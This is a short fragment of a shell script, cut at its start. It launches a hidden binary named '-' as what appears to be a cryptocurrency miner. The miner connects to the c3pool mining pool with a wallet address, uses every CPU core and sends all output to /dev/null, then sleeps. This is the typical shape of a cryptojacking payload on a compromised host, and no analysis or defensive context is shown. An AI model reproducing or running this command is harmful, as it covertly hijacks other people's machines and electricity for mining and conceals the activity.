...
ph add -
./- -o auto.c3pool.org:80 -u 8ARZp6tyeNzMcq9zheXVcoA2z3VVuueCTJZkmNmwh36yRztNuoLFqLUWZDysmSM5q7fyqcYdn1BcDfzJtHXdQMEdTsG6eDB.الجُمُعَةُ -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
